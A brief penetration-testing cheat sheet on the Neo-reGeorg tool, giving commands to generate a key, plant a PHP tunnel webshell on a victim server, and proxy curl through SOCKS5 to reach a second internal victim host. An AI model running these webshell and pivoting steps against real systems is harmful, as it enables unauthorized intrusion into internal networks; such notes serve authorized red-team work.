## Tools: Neo-reGeorg https://github.com/L-codes/Neo-reGeorg

#### 1) Generate key

    python3 neoreg.py generate -k KEY 

#### 2) Upload the PHP file to SERVER1

#### 3) Authenticate to the webshell with your key

    python3 neoreg.py -k KEY -u http://VICTIM_SERVER1/uploader/files/tunnel.php

#### 4) 

    curl --socks5 127.0.0.1:1080 http://VICTIM_SERVER2:80 

## TIP" We can also use proxychains or FoxyProxy
